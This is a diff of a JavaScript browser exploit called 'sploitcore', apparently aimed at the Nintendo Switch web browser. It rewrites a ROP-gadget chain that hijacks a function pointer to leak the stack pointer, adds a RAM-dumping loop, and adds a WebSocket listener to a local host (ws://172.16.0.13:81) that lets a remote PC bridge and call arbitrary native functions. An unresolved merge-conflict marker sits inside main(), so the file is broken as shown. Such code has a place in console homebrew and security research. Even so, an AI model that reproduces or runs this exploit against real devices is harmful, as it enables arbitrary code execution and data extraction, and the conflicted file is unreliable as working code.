@@ -121,6 +121,7 @@ var sploitcore = function() {
 	dlog('Main address ' + paddr(this.mainaddr));
 };
 
+
 sploitcore.prototype.allocBuffers = function() {
 	dlog('Making ' + this.bufs.length + ' buffers');
 	for(var i = 0; i < this.bufs.length; ++i)
@@ -363,68 +364,68 @@ sploitcore.prototype.walkList = function() {
 };
 
 sploitcore.prototype.getSP = function() {
-	var jaddr = this.mref(0x39FEEC); // First gadget
-	dlog('New jump at ' + paddr(jaddr));
-	dlog('Assigning function pointer');
+  var jaddr = this.mref(0x39FEEC); // First gadget
+  dlog('New jump at ' + paddr(jaddr));
+  dlog('Assigning function pointer');
 
-	dlog('Function object at ' + paddr(this.funcaddr));
-	var curptr = this.read8(this.funcaddr, 8);
+  dlog('Function object at ' + paddr(this.funcaddr));
+  var curptr = this.read8(this.funcaddr, 8);
 
-	var fixed = this.mref(0x91F320);
-	var saved = new Uint32Array(0x18 >> 2);
-	for(var i = 0; i < saved.length; ++i)
-		saved[i] = this.read4(fixed, i);
-	
-	var struct1 = this.malloc(0x48);
-	var struct2 = this.malloc(0x28);
-	var struct3 = this.malloc(0x518);
-	var struct4 = this.malloc(0x38);
+  var fixed = this.mref(0x91F320);
+  var saved = new Uint32Array(0x18 >> 2);
+  for(var i = 0; i < saved.length; ++i)
+    saved[i] = this.read4(fixed, i);
+  
+  var struct1 = this.malloc(0x48);
+  var struct2 = this.malloc(0x28);
+  var struct3 = this.malloc(0x518);
+  var struct4 = this.malloc(0x38);
 
-	this.write8(struct1, fixed, 0);
-	this.write8(this.mref(0x4967F0), fixed, 0x8 >> 2); // Second gadget
-	this.write8(this.mref(0x48FE44), fixed, 0x10 >> 2); // Third gadget
+  this.write8(struct1, fixed, 0);
+  this.write8(this.mref(0x4967F0), fixed, 0x8 >> 2); // Second gadget
+  this.write8(this.mref(0x48FE44), fixed, 0x10 >> 2); // Third gadget
 
-	this.write8(struct2, struct1, 0x10 >> 2);
+  this.write8(struct2, struct1, 0x10 >> 2);
 
-	this.write8(struct3, struct2, 0);
-	this.write8(this.mref(0x2E5F88), struct2, 0x20 >> 2);
+  this.write8(struct3, struct2, 0);
+  this.write8(this.mref(0x2E5F88), struct2, 0x20 >> 2);
 
-	this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
-	this.write8(this.mref(0x1892A4), struct3, 0x18 >> 2);
-	this.write8(this.mref(0x46DFD4), struct3, 0x20 >> 2);
-	this.write8(struct4, struct3, 0x510 >> 2);
+  this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
+  this.write8(this.mref(0x1892A4), struct3, 0x18 >> 2);
+  this.write8(this.mref(0x46DFD4), struct3, 0x20 >> 2);
+  this.write8(struct4, struct3, 0x510 >> 2);
 
-	this.write8(this.mref(0x1F61C0), struct4, 0x18 >> 2);
-	this.write8(this.mref(0x181E9C), struct4, 0x28 >> 2);
-	this.write8(this.mref(0x1A1C98), struct4, 0x30 >> 2);
+  this.write8(this.mref(0x1F61C0), struct4, 0x18 >> 2);
+  this.write8(this.mref(0x181E9C), struct4, 0x28 >> 2);
+  this.write8(this.mref(0x1A1C98), struct4, 0x30 >> 2);
 
-	this.write8(jaddr, this.funcaddr, 8);
+  this.write8(jaddr, this.funcaddr, 8);
 
-	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
+  dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
 
-	dlog('Assigned.  Jumping.');
-	this.func.apply(0x101);
-	dlog('Jumped back.');
+  dlog('Assigned.  Jumping.');
+  this.func.apply(0x101);
+  dlog('Jumped back.');
 
-	var sp = add2(this.read8(struct3, 0), -0x18);
+  var sp = add2(this.read8(struct3, 0), -0x18);
 
-	dlog('Got stack pointer: ' + paddr(sp));
+  dlog('Got stack pointer: ' + paddr(sp));
 
-	this.write8(curptr, this.funcaddr, 8);
+  this.write8(curptr, this.funcaddr, 8);
 
-	dlog('Restored original function pointer.');
-	for(var i = 0; i < saved.length; ++i)
-		this.write4(saved[i], fixed, i);
-	dlog('Restored data page.');
+  dlog('Restored original function pointer.');
+  for(var i = 0; i < saved.length; ++i)
+    this.write4(saved[i], fixed, i);
+  dlog('Restored data page.');
 
-	this.free(struct1);
-	this.free(struct2);
-	this.free(struct3);
-	this.free(struct4);
+  this.free(struct1);
+  this.free(struct2);
+  this.free(struct3);
+  this.free(struct4);
 
-	dlog('Freed buffers');
+  dlog('Freed buffers');
 
-	return sp;
+  return sp;
 };
 
 sploitcore.prototype.malloc = function(bytes) {
@@ -1022,9 +1023,9 @@ sploitcore.prototype.gc = function() {
 
 var int = 'int', bool = 'bool', char_p = 'char*', void_p = 'void*';
 
-function main() {
-	var sc = new sploitcore();
+var bridgedFns = {}
 
+<<<<<<< HEAD
 	//sc.gc();
 	//sc.gc();
 
@@ -1051,51 +1052,153 @@ function main() {
 				break;
 			}
 		}
+=======
+function handler (sc, socket) {
+	return function (event) {
+		var data = JSON.parse(event.data)
+
+		if (data.cmd === 'getSP') {
+			log('running getSP()...')
+			var sp = sc.getSP()
+
+			socket.send(JSON.stringify({
+				type: 'sp',
+				response: paddr(sc.getSP())
+			}))
+		} else if (data.cmd === 'call') {
+      log('got data:' + JSON.stringify(data))
+      var name = data.args.shift()
+
+      log('trying to use saved fn ' + name)
+
+      var fn = bridgedFns[name]
+
+      if (!fn) {
+        return log('unknown bridged fn')
+      }
+
+      var out = paddr(fn.apply(fn, data.args))
+
+			socket.send(JSON.stringify({
+				type: 'call',
+				response: out
+			}))
+		} else if (data.cmd === 'gc') {
+      log('running GC')
+      sc.gc()
+      socket.send(JSON.stringify({
+        type: 'gcran'
+      }))
+    } else if (data.cmd === 'bridge') {
+      var name = data.args.shift()
+
+      // Parse addr
+      data.args[0] = parseInt(data.args[0])
+
+      var fn = sc.bridge.apply(sc, data.args)
+
+      log('saved fn as ' + name)
+
+      bridgedFns[name] = fn
+
+      socket.send(JSON.stringify({
+        type: 'bridged'
+      }))
+    } else if (data.cmd === 'bridges') {
+      socket.send(JSON.stringify({
+        type: 'bridges',
+        response: Object.keys(bridgedFns)
+      }))
+    }
 	}
+}
 
-	log('Calling sleepthread...');
-	var ret = sc.svc(0xB, [[0x2A05F200, 0x1]], true); // SvcSleepThread(5000000000 ns) = sleep for 5 seconds
-	log('Sleepthread returned ' + paddr(ret));
-	
-	
-	//sc.dirlist('shareddata:/');
+function setupListener (sc) {
+  var socket = new WebSocket("ws://172.16.0.13:81")
 
-	//folders
-	//sc.dirlist('data:/');
-	//sc.dirlist('offline:/'); //crashes
-	//sc.dirlist('sd:/'); //crashes
-	//sc.dirlist('sdcard:/'); //crashes
-	//sc.dirlist('saveuser:/'); //crashes
-	//sc.dirlist('savecommon:/'); //crashes
-	//sc.dirlist('blacklist:/');
-	//sc.dirlist('shareddata:/');
-	//sc.dirlist('oceanShared:/');
-	//sc.dirlist('oceanShared:/lyt');
-	//sc.dirlist('shareddata:/webdatabase');
-	//sc.dirlist('shareddata:/browser/emoji');
-	//sc.dirlist('shareddata:/browser/page');
+  socket.onmessage = handler(sc, socket)
 
-	//files
-	//sc.dumpFile('oceanShared:/dummy.txt');
-	//sc.dumpFile('shareddata:/buildinfo/buildinfo.dat');
-	//sc.dumpFile('shareddata:/browser/Skin.dat');
-	//sc.dumpFile('shareddata:/browser/MediaControls.css');
-	//sc.dumpFile('shareddata:/browser/MediaControls.js');
-	//sc.dumpFile('shareddata:/browser/ErrorPageTemplate.html');
-	//sc.dumpFile('shareddata:/browser/ErrorPageSubFrameTemplate.html');
-	//sc.dumpFile('shareddata:/browser/ErrorPageFilteringTemplate.html');
-	//sc.dumpFile('shareddata:/browser/UserCss.dat');
-	//sc.dumpFile('shareddata:/browser/RootCaSdk.pem');
-	//sc.dumpFile('shareddata:/browser/RootCaEtc.pem');
-	//sc.dumpFile('shareddata:/browser/effective_tld_names.dat');
-	//sc.dumpFile('shareddata:/.nrr/netfront.nrr');
-	//sc.dumpFile('shareddata:/dll/peer_wkc.nro');
-	//sc.dumpFile('shareddata:/dll/oss_wkc.nro');
-	//sc.dumpFile('shareddata:/dll/cairo_wkc.nro');
-	//sc.dumpFile('shareddata:/dll/libfont.nro');
-	//sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
-	//sc.dumpFile('data:/sound/cruiser.bfsar');
+  socket.onopen = function () {
+    log('Connected to PC..')
+  }
+}
 
-	//var ret = 0x3F99DC;
-	//sc.call(ret, [256,257,258,259,260,261,262,263], [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30], true);
+function main() {
+	var sc = new sploitcore();
+
+  //sc.gc();
+  //sc.gc();
+
+  log(paddr(sc.getSP()));
+
+  var dump_all_ram = false;
+
+  //log(sc.getservicehandle("appletAE"));
+
+  if (dump_all_ram) {
+    var addr = [0, 0];
+    var last = [0, 0];
+    while(true) {
+      var mi = sc.querymem(addr);
+      last = addr;
+      addr = add2(mi[0], mi[1]);
+      log(paddr(mi[0]) + ' - ' + paddr(addr) + '  ' + mi[2] + ' ' + mi[3]);
+      
+      if(mi[3] != 'NONE')
+        sc.memdump(mi[0], mi[1][0], 'memdumps/'+paddr(mi[0]) + ' - ' + paddr(addr) + ' - ' + mi[3] + '.bin');
+      
+      if(addr[1] < last[1]) {
+        log('End');
+        break;
+      }
+    }
+  }
+
+  // log('Calling sleepthread...');
+  // var ret = sc.svc(0xB, [[0x2A05F200, 0x1]], true); // SvcSleepThread(5000000000 ns) = sleep for 5 seconds
+  // log('Sleepthread returned ' + paddr(ret));
+
+
+  //sc.dirlist('shareddata:/');
+
+  //folders
+  //sc.dirlist('data:/');
+  //sc.dirlist('offline:/'); //crashes
+  //sc.dirlist('sd:/'); //crashes
+  //sc.dirlist('sdcard:/'); //crashes
+  //sc.dirlist('saveuser:/'); //crashes
+  //sc.dirlist('savecommon:/'); //crashes
+  //sc.dirlist('blacklist:/');
+  //sc.dirlist('shareddata:/');
+  //sc.dirlist('oceanShared:/');
+  //sc.dirlist('oceanShared:/lyt');
+  //sc.dirlist('shareddata:/webdatabase');
+  //sc.dirlist('shareddata:/browser/emoji');
+  //sc.dirlist('shareddata:/browser/page');
+
+  //files
+  //sc.dumpFile('oceanShared:/dummy.txt');
+  //sc.dumpFile('shareddata:/buildinfo/buildinfo.dat');
+  //sc.dumpFile('shareddata:/browser/Skin.dat');
+  //sc.dumpFile('shareddata:/browser/MediaControls.css');
+  //sc.dumpFile('shareddata:/browser/MediaControls.js');
+  //sc.dumpFile('shareddata:/browser/ErrorPageTemplate.html');
+  //sc.dumpFile('shareddata:/browser/ErrorPageSubFrameTemplate.html');
+  //sc.dumpFile('shareddata:/browser/ErrorPageFilteringTemplate.html');
+  //sc.dumpFile('shareddata:/browser/UserCss.dat');
+  //sc.dumpFile('shareddata:/browser/RootCaSdk.pem');
+  //sc.dumpFile('shareddata:/browser/RootCaEtc.pem');
+  //sc.dumpFile('shareddata:/browser/effective_tld_names.dat');
+  //sc.dumpFile('shareddata:/.nrr/netfront.nrr');
+  //sc.dumpFile('shareddata:/dll/peer_wkc.nro');
+  //sc.dumpFile('shareddata:/dll/oss_wkc.nro');
+  //sc.dumpFile('shareddata:/dll/cairo_wkc.nro');
+  //sc.dumpFile('shareddata:/dll/libfont.nro');
+  //sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
+  //sc.dumpFile('data:/sound/cruiser.bfsar');
+
+  //var ret = 0x3F99DC;
+  //sc.call(ret, [256,257,258,259,260,261,262,263], [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30], true);
+
+  setupListener(sc)
 }
